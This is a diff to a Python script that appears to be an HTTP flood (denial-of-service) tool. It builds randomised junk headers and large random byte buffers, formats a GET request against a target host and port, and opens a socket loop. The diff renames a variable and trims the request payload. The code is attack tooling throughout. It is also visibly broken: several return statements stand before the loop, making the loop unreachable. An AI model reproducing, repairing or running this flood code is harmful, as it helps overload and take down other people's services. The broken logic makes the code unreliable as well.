@@ -436,11 +436,11 @@ def start2():
   
 def start():
   global useragents, acceptall, ref, socks5
-  global hh, byte2, socks2, byte3
+  global hh, byte2, socks2, sock3
   hh = random._urandom(75006)
   byte2 = random._urandom(34002)
   xx = int(0)
-  byte3 = "Sockets2: "+random.choice(useragents)+random.choice(acceptall)+random.choice(ref)+random.choice(socks5)+random.choice(socks2)+"\r\n"
+  sock3 = "Sockets2: "+random.choice(useragents)+random.choice(acceptall)+random.choice(ref)+random.choice(socks5)+random.choice(socks2)+"\r\n"
   userKagen = "UserAgents: "+random.choice(useragents)+random.choice(acceptall)+random.choice(ref)+"\r\n"
   Userkw = "Binatang: "+random.choice(socks5)+random.choice(ref)+random.choice(useragents)+random.choice(acceptall)+"\r\n"
   acceptser = "AcceptAdmin: "+random.choice(acceptall)+random.choice(ref)+"\r\n"
@@ -448,10 +448,10 @@ def start():
   content    = "Content-Type: application/x-www-form-urlencoded\r\n"
   length     = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
   target_host = "GET / HTTP/1.1\r\nHost: {0}:{1}\r\n".format(str(ip), int(port))
-  main_host = userKagen + acceptser + referrer + content + length + Userkw + target_host + byte3 + byte2 + "\r\n"
+  main_host = userKagen + acceptser + referrer + content + length + Userkw + target_host  + "\r\n"
   return hh
   return byte2
-  return byte3
+  return sock3
   while True:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
